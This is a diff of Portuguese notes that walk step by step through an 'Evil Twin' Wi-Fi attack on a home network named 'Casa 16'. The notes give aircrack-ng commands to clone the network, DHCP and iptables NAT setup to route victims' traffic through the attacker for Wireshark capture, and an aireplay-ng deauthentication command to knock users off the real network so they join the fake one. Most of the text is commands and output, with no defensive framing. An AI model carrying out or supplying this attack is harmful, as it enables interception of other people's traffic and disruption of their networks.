@@ -1,14 +1,14 @@
-                                               Twuin Evil - > Forjar uma rede conhecida 
+                                                  Twuin Evil - > Forjar uma rede conhecida 
                                                
- airmon-ng start wlan0 - > modo monitor 
- airodump-ng wlan0mon - > escutar ondas rádios 
+ #airmon-ng start wlan0 - > modo monitor 
+ #airodump-ng wlan0mon - > escutar ondas rádios 
 
 
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                           
  
 EC:4D:47:20:C7:58  -38       58      823    6   3  130   WPA2 CCMP   PSK  Casa 16  
 
-airodump-ng wlan0mon -c 3 - > selecionando o canal onde o alvo está. 
+#airodump-ng wlan0mon -c 3 - > selecionando o canal onde o alvo está. 
  ALVO:
  EC:4D:47:20:C7:58 - > BSSID 
  Casa 16  - > ESSID 
@@ -22,8 +22,9 @@ airodump-ng wlan0mon -c 3 - > selecionando o canal onde o alvo está.
   nano lista.txt
   Casa 16
  
- airbase-ng --essids lista.txt -c 3 wlan0mon - > criando um AP
- 17:32:53  Created tap interface at0
+ #airbase-ng --essids lista.txt -c 3 -P wlan0mon - > criando um AP
+ 
+ ]17:32:53  Created tap interface at0
  17:32:53  Trying to set MTU on at0 to 1500
  17:32:53  Trying to set MTU on wlan0mon to 1800
  17:32:53  Access Point with BSSID 78:D3:8D:02:4D:06 started.
@@ -31,8 +32,8 @@ airodump-ng wlan0mon -c 3 - > selecionando o canal onde o alvo está.
  Created tap interface at0 - > interface de rede criada ( não configurada e sem acesso a internet ) 
  at0 - > nossa interface de rede  
  
- ifconfig at0 up - > ativando interface de rede 
- ifconfig 
+ #ifconfig at0 up - > ativando interface de rede 
+ #ifconfig 
 
 at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet6 fe80::7ad3:8dff:fe02:4d06  prefixlen 64  scopeid 0x20<link>
@@ -45,7 +46,7 @@ at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 nossa rede - > 192.168.100.0/24 
 sub rede possivel - > 192.168.2.1/24 
 
-ifconfig at0 192.168.2.1/24 - > Defina que a interface at0 terá como gatway 192.168.100.1
+#ifconfig at0 192.168.2.1/24 - > Defina que a interface at0 terá como gatway 192.168.100.1
 Observação: logo a rede será 192.168.100.0 
 
 route - > Ver as rotas de pacotes 
@@ -67,7 +68,7 @@ add - > adicione
 netmask - > mascara 
 gw - > gatway 
 
-route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1 
+#route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1 
 
 Tabela de Roteamento IP do Kernel
 Destino         Roteador        MáscaraGen.    Opções Métrica Ref   Uso Iface
@@ -77,6 +78,56 @@ default         192.168.100.1   0.0.0.0         UG    100    0        0 eth0
 192.168.100.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0
 
 temos uma rede 192.168.2.0 com o gatway 192.168.2.1 
+
+Precisamos de internet e configurar a resposta da nossa interface com o usuário que irá se conectar: 
+ 
+resposta da nossa interface com o cliente - > fornece um ip na rede ao cliente, o gatway padrão e mascara
+iptables - > redirecionar o gatway para o gatway que possui conexão com internet.
+
+#apt-get install isc-dhcp-server
+
+nano /etc/dhcp/dhcpd.conf
+
+authoritative;
+
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.2.0 netmask 255.255.255.0 {
+option subnet-mask 255.255.255.0;
+option routers 192.168.2.1;
+option domain-name-servers 8.8.8.8;
+range 192.168.2.100 192.168.2.175;
+}
+
+# dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+# /etc/init.d/isc-dhcp-server start
+
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward - > permitir IP FORWARD ( jogar pacotes de um ip para outro ) 
+Regras IPTables:
+
+iptables --flush - > remove  todas as regras 
+iptables --table nat --flush - > limpar a tabela nat - > https://www.makeuseof.com/tag/what-is-nat-table/
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+
+wireshark 
+
+
+
+Ataque de desautenticação na WLAN original:
+
+#aireplay-ng -0 <numero de repeticoes do ataque> -a <bssid> wlan0mon
+
+
+
+
+
+
+Considerações: Por que não utilizei o bssid neste ataque? Porque após a clonagem de rede precisamos desconectar as pessoas da rede original para que elas possam conectar-se a nossa rede falsa através da conexão automática.
 
 
 
